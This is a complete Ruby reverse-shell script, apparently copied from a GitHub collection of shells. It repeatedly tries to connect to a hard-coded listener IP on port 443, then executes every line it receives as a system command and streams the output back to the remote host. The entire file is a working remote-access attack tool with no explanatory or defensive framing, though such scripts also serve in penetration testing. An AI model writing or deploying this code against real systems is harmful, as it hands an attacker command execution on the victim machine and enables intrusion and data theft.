#!/usr/bin/env ruby
# Source: https://github.com/secjohn/ruby-shells/blob/master/revshell.rb
require 'socket'
require 'open3'

LHOST = "192.168.49.230" 
PORT = "443"

#Tries to connect every 20 sec until it connects.
begin
sock = TCPSocket.new "#{LHOST}", "#{PORT}"
sock.puts "We are connected!"
rescue
  sleep 20
  retry
end

#Runs the commands you type and sends you back the stdout and stderr.
begin
  while line = sock.gets
    Open3.popen2e("#{line}") do | stdin, stdout_and_stderr |
              IO.copy_stream(stdout_and_stderr, sock)
              end  
  end
rescue
  retry
end 
